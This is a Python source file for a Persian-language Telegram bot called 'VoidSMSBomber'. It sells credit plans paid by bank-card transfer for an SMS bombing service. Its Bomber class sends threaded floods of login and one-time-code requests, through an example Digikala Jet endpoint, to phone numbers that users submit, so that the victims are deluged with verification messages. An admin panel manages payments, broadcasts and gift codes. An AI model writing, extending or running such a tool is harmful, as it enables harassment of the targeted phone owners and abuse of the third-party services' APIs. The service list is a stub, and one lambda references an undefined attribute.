import random
import threading
import time
import requests
import phonenumbers
import os
import json
import sqlite3
import telebot
from telebot import types
from flask import Flask
from datetime import datetime

# ==========================================
# 1. وب‌سرور برای سلامت پورت (Render)
# ==========================================
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is running!", 200
def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, use_reloader=False)
threading.Thread(target=run_web, daemon=True).start()

# ==========================================
# 2. تنظیمات و دیتابیس
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = 6914309071
CARD_NUMBER = "[شماره_کارت_اینجا]" # ⚠️ شماره کارت خودت رو اینجا بذار
DB_FILE = "bot_database.db"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

# 👇 لینک عکس (همون لینکی که فرستادی)
PANEL_IMAGE_URL = "https://i.imgur.com/Z7lvgzO.jpeg"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY, name TEXT, plan TEXT, uses INTEGER, 
        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT,
        total_purchases INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()
init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row: return {"user_id": row[0], "name": row[1], "plan": row[2], "uses": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7], "total_purchases": row[8]}
    return None

def save_user(user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", 
              (user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases))
    conn.commit()
    conn.close()

user_states, pending_approvals, active_bombers, active_gift_codes = {}, {}, {}, {}

PLANS = {
    "basic": {"name": "پایه", "price": 150, "uses": 10, "days": 0},
    "pro": {"name": "حرفه‌ای", "price": 450, "uses": 50, "days": 0},
    "vip": {"name": "ویژه (VIP)", "price": 600, "uses": 9999, "days": 30}
}

# ==========================================
# 3. هسته بمبر
# ==========================================
class Bomber:
    def __init__(self, phone_numbers, user_id):
        self.phone_numbers = phone_numbers.split(",") if "," in phone_numbers else [phone_numbers]
        self.user_id = user_id
        self.services = []
        self.load_services()
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.success = 0
        self.fail = 0

    def load_services(self):
        # ⚠️ لیست سرویس‌های خودت رو اینجا کپی کن
        self.services = [
            {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            # ...
        ]

    def send_request(self, service, phone):
        if self.stop_event.is_set(): return
        try:
            data = service['data']()
            if 'phone' in data: data['phone'] = phone
            if 'mobile' in data: data['mobile'] = phone
            headers = {'User-Agent': "Mozilla/5.0"}
            method = service['method'].upper()
            use_json = service.get('json', False)
            if method == 'POST':
                if use_json: resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else: resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)
            if resp.status_code in (200, 201, 202, 204): self.success += 1
            else: self.fail += 1
        except: self.fail += 1

    def worker(self, subset, phone):
        for service in subset:
            if self.stop_event.is_set(): break
            self.send_request(service, phone)
            time.sleep(0.3)

    def start(self):
        if not self.services:
            bot.send_message(self.user_id, "❌ لیست سرویس‌ها خالی است.")
            return
        self.success, self.fail = 0, 0
        total = len(self.services) * len(self.phone_numbers)
        chunk_size = max(1, len(self.services) // 15)
        threads = []
        
        for phone in self.phone_numbers:
            if not phone.startswith("+"): phone = "+98" + phone.lstrip("0")
            chunks = [self.services[i:i + chunk_size] for i in range(0, len(self.services), chunk_size)]
            for chunk in chunks:
                t = threading.Thread(target=self.worker, args=(chunk, phone))
                t.start()
                threads.append(t)
                
        for t in threads: t.join()
        percent = int((self.success / total) * 100) if total > 0 else 0
        bot.send_message(self.user_id, f"🏁 **گزارش:**\n✅ موفق: {self.success}\n❌ ناموفق: {self.fail}\n📊 درصد: {percent}%", parse_mode='Markdown')
        if self.user_id in active_bombers: del active_bombers[self.user_id]

# ==========================================
# 4. منوها
# ==========================================
def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="menu_bomb"),
        types.InlineKeyboardButton("🛒 خرید پلن", callback_data="menu_buy")
    )
    markup.add(
        types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily"),
        types.InlineKeyboardButton("📋 حساب کاربری", callback_data="menu_profile")
    )
    markup.add(
        types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard"),
        types.InlineKeyboardButton("👑 باشگاه VIP", callback_data="menu_vip_club")
    )
    markup.add(types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support"))
    markup.add(types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"))
    return markup

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if not user:
        save_user(user_id, message.from_user.first_name, "none", 0, 0, 0, 0, "2000-01-01")
        
    caption = f"سلام {message.from_user.first_name}! 👋\nبه ربات **VoidSMSBomber** خوش آمدید."
    try:
        bot.send_photo(message.chat.id, PANEL_IMAGE_URL, caption=caption, reply_markup=get_main_menu(), parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, caption, reply_markup=get_main_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
        types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("🎁 شارژ همگانی", callback_data="admin_bulk_charge"),
        types.InlineKeyboardButton("📉 کسر همگانی", callback_data="admin_bulk_deduct"),
        types.InlineKeyboardButton("🔑 ساخت کد هدیه", callback_data="admin_gifts"),
        types.InlineKeyboardButton("👤 مشاهده کاربر", callback_data="admin_view_user"),
        types.InlineKeyboardButton("💾 دریافت بکاپ", callback_data="admin_backup")
    )
    bot.reply_to(message, "👑 **پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = str(call.from_user.id)
    user = get_user(user_id)
    
    if call.data == "menu_back":
        caption = "منوی اصلی:"
        try:
            bot.edit_message_media(types.InputMediaPhoto(PANEL_IMAGE_URL, caption=caption, parse_mode='Markdown'), call.message.chat.id, call.message.message_id, reply_markup=get_main_menu())
        except:
            bot.edit_message_text(caption, call.message.chat.id, call.message.message_id, reply_markup=get_main_menu(), parse_mode='Markdown')
    
    elif call.data == "menu_vip_club":
        text = "👑 **باشگاه VIP**\n\nمزایای عضویت:\n- ارسال نامحدود\n- پشتیبانی اختصاصی\n\nبرای عضویت، پلن VIP را خریداری کنید."
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("خرید VIP", callback_data="buy_vip"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_profile":
        plan_name = PLANS[user['plan']]['name'] if user['plan'] in PLANS else "بدون پلن"
        sub_status = "فعال" if user['sub_expiry'] > time.time() else "منقضی"
        text = f"📋 **پروفایل:**\n\n👤 نام: {user['name']}\n💎 پلن: **{plan_name}**\n⚡️ اعتبار: **{user['uses']}**\n📅 وضعیت VIP: **{sub_status}**"
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("✏️ تغییر نام", callback_data="menu_change_name"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_change_name":
        user_states[user_id] = {"state": "waiting_for_name"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_profile"))
        bot.edit_message_caption("✏️ نام جدید:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "menu_leaderboard":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT name, uses FROM users ORDER BY uses DESC LIMIT 5")
        rows = c.fetchall()
        conn.close()
        text = "🏆 **۵ کاربر برتر:**\n\n" + "".join([f"{i}. {row[0]} ➜ {row[1]} اعتبار\n" for i, row in enumerate(rows, 1)])
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_support":
        user_states[user_id] = {"state": "waiting_for_support"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption("🎧 پیام خود را بنویسید:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "menu_daily":
        if time.time() - user['last_daily'] < 86400:
            bot.answer_callback_query(call.id, "⏳ امروز گرفته‌اید!", show_alert=True)
        else:
            user['uses'] += 2
            user['last_daily'] = time.time()
            save_user(**user)
            bot.answer_callback_query(call.id, "🎉 ۲ اعتبار رایگان!", show_alert=True)

    elif call.data == "menu_gift":
        user_states[user_id] = {"state": "waiting_for_gift"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption("🔑 کد هدیه:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "menu_buy":
        text = "🛒 **پلن‌ها:**\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, plan in PLANS.items():
            markup.add(types.InlineKeyboardButton(f"{plan['name']} | {plan['price']} تومان", callback_data=f"buy_{key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("buy_"):
        plan_key = call.data.replace("buy_", "")
        plan = PLANS[plan_key]
        user_states[user_id] = {"selected_plan": plan_key}
        
        text = f"✅ پلن **{plan['name']}** انتخاب شد.\n\n💳 مبلغ **{plan['price']} هزار تومان** را واریز کنید:\n`{CARD_NUMBER}`\n\n📸 سپس **عکس رسید** را بفرستید."
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_buy"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_bomb":
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_bomb_date'] != today:
            user['last_bomb_date'] = today
            user['daily_bomb_count'] = 0
        if user['daily_bomb_count'] >= 5 and user['plan'] != 'vip':
            bot.answer_callback_query(call.id, "⚠️ سهمیه امروز پر شده!", show_alert=True)
            return
        if user['plan'] == "vip" and user['sub_expiry'] > time.time(): pass
        elif user['uses'] <= 0:
            bot.answer_callback_query(call.id, "❌ اعتبار ندارید!", show_alert=True)
            return
        user_states[user_id] = {"state": "waiting_for_phone"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption("📞 **شماره را وارد کنید:**\n(برای ارسال گروهی با کاما جدا کنید)", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    # ================= ادمین =================
    elif call.data == "admin_stats" and call.from_user.id == ADMIN_ID:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        c.execute("SELECT SUM(uses) FROM users")
        total_credits = c.fetchone()[0] or 0
        conn.close()
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"📊 **آمار:**\n👥 کاربران: {total_users}\n💰 اعتبارها: {total_credits}", parse_mode='Markdown')

    elif call.data == "admin_broadcast" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📝 متن پیام:")
        bot.register_next_step_handler(msg, send_broadcast)

    elif call.data == "admin_bulk_charge" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🎁 چند اعتبار به همه کاربران اضافه کنم؟ (فقط عدد):")
        bot.register_next_step_handler(msg, process_bulk_charge)

    elif call.data == "admin_bulk_deduct" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📉 چند اعتبار از همه کاربران کم کنم؟ (فقط عدد):")
        bot.register_next_step_handler(msg, process_bulk_deduct)

    elif call.data == "admin_gifts" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🔑 فرمت: `CODE USES` (مثال: `WELCOME 10`):")
        bot.register_next_step_handler(msg, process_make_gift)

    elif call.data == "admin_view_user" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🆔 آیدی عددی کاربر:")
        bot.register_next_step_handler(msg, view_user_admin)

    elif call.data == "admin_backup" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'rb') as f:
                bot.send_document(ADMIN_ID, f)

    elif call.data.startswith("admin_reply_") and call.from_user.id == ADMIN_ID:
        target_user = call.data.replace("admin_reply_", "")
        msg = bot.send_message(call.message.chat.id, "پاسخ خود را بنویسید:")
        bot.register_next_step_handler(msg, lambda m: send_reply_to_user(m, target_user))

    elif call.data.startswith("admin_approve_"):
        req_id = call.data.replace("admin_approve_", "")
        if req_id in pending_approvals:
            data = pending_approvals[req_id]
            uid, plan_key = data["user_id"], data["plan"]
            plan = PLANS[plan_key]
            user_data = get_user(uid)
            if user_data:
                user_data["plan"] = plan_key
                user_data["uses"] += plan["uses"]
                user_data["total_purchases"] += 1
                if plan.get('days', 0) > 0: user_data["sub_expiry"] = time.time() + (plan['days'] * 86400)
                save_user(**user_data)
                bot.send_message(uid, f"🎉 **پرداخت تایید شد!**\nپلن **{plan['name']}** فعال شد.", parse_mode='Markdown')
            bot.edit_message_text(f"✅ تایید شد.", call.message.chat.id, call.message.message_id)
            del pending_approvals[req_id]

    elif call.data.startswith("admin_reject_"):
        req_id = call.data.replace("admin_reject_", "")
        if req_id in pending_approvals:
            uid = pending_approvals[req_id]["user_id"]
            bot.edit_message_text("❌ رد شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, "❌ رسید شما رد شد.")
            del pending_approvals[req_id]

# ==========================================
# 5. دریافت ورودی‌ها
# ==========================================
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.from_user.id)
    if "selected_plan" not in user_states.get(user_id, {}):
        bot.reply_to(message, "⚠️ ابتدا از منو یک پلن انتخاب کنید.")
        return
        
    plan_key = user_states[user_id]["selected_plan"]
    plan = PLANS[plan_key]
    req_id = f"{user_id}_{int(time.time())}"
    pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
    
    bot.reply_to(message, "✅ رسید دریافت شد. منتظر تایید باشید.")
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"),
        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}")
    )
    
    bot.send_message(ADMIN_ID, f"📩 **رسید:**\nکاربر: `{user_id}`\nپلن: **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    del user_states[user_id]

@bot.message_handler(func=lambda message: str(message.from_user.id) in user_states)
def process_text_inputs(message):
    user_id = str(message.from_user.id)
    state = user_states[user_id].get("state")
    user = get_user(user_id)
    
    if message.text == "لغو":
        del user_states[user_id]
        bot.reply_to(message, "عملیات لغو شد.", reply_markup=get_main_menu())
        return
    
    if state == "waiting_for_name":
        user['name'] = message.text
        save_user(**user)
        bot.reply_to(message, "✅ نام تغییر کرد.")
        del user_states[user_id]

    elif state == "waiting_for_support":
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✍️ پاسخ", callback_data=f"admin_reply_{user_id}"))
        bot.send_message(ADMIN_ID, f"🎧 پیام از `{user_id}`:\n\n{message.text}", reply_markup=markup)
        bot.reply_to(message, "✅ پیام ارسال شد.")
        del user_states[user_id]

    elif state == "waiting_for_phone":
        phones = message.text.strip().replace(" ", "").split(",")
        if any(len(p) < 10 or not p.isdigit() for p in phones):
            bot.reply_to(message, "❌ فرمت نامعتبر. (مثال: 09123456789)")
            return
        
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_bomb_date'] != today:
            user['last_bomb_date'] = today
            user['daily_bomb_count'] = 0
            
        if user['daily_bomb_count'] >= 5 and user['plan'] != 'vip':
            bot.reply_to(message, "❌ سهمیه پر شده!")
            del user_states[user_id]
            return
            
        if user['plan'] == "vip" and user['sub_expiry'] > time.time(): pass
        elif user['uses'] < len(phones):
            bot.reply_to(message, f"❌ اعتبار کافی ندارید! (نیاز: {len(phones)})")
            del user_states[user_id]
            return
        else: user['uses'] -= len(phones)
            
        user['daily_bomb_count'] += len(phones)
        save_user(**user)
        del user_states[user_id]
        
        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{len(phones)}` شماره", parse_mode='Markdown')
        bomber = Bomber(",".join(phones), user_id)
        active_bombers[user_id] = bomber
        threading.Thread(target=bomber.start).start()

    elif state == "waiting_for_gift":
        code = message.text.strip().upper()
        del user_states[user_id]
        if code in active_gift_codes and active_gift_codes[code]["uses"] > 0:
            amount = active_gift_codes[code]["amount"]
            active_gift_codes[code]["uses"] -= 1
            user['uses'] += amount
            save_user(**user)
            bot.reply_to(message, f"🎁 {amount} اعتبار اضافه شد.")
        else:
            bot.reply_to(message, "❌ کد نامعتبر.")

def send_broadcast(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    for u in users:
        try: bot.send_message(u[0], f"📢 {message.text}"); time.sleep(0.1)
        except: pass
    bot.reply_to(message, f"✅ ارسال شد.")

def process_bulk_charge(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.strip())
        if amount <= 0: return
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET uses = uses + ?", (amount,))
        conn.commit()
        c.execute("SELECT user_id FROM users")
        users = c.fetchall()
        conn.close()
        for u in users:
            try: bot.send_message(u[0], f"🎁 **هدیه!**\n{amount} اعتبار اضافه شد.", parse_mode='Markdown'); time.sleep(0.05)
            except: pass
        bot.send_message(ADMIN_ID, f"✅ شارژ انجام شد.")
    except: pass

def process_bulk_deduct(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.strip())
        if amount <= 0: return
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET uses = MAX(0, uses - ?)", (amount,))
        conn.commit()
        conn.close()
        bot.send_message(ADMIN_ID, f"✅ کسر همگانی انجام شد.\n{amount} اعتبار کم شد.")
    except: pass

def process_make_gift(message):
    try:
        parts = message.text.split()
        active_gift_codes[parts[0].upper()] = {"uses": int(parts[1]), "amount": 5}
        bot.reply_to(message, f"✅ کد ساخته شد.")
    except: bot.reply_to(message, "❌ فرمت اشتباه.")

def view_user_admin(message):
    uid = message.text.strip()
    user = get_user(uid)
    if user:
        bot.reply_to(message, f"👤 {user['name']}\n💎 {user['plan']}\n⚡️ {user['uses']}")
    else: bot.reply_to(message, "❌ کاربر یافت نشد.")

def send_reply_to_user(message, target_user):
    try:
        bot.send_message(target_user, f"📩 **پاسخ پشتیبانی:**\n\n{message.text}", parse_mode='Markdown')
        bot.reply_to(message, "✅ پاسخ ارسال شد.")
    except: bot.reply_to(message, "❌ خطا.")

if __name__ == "__main__":
    print("🤖 Bot & Web Server running...")
    bot.infinity_polling()
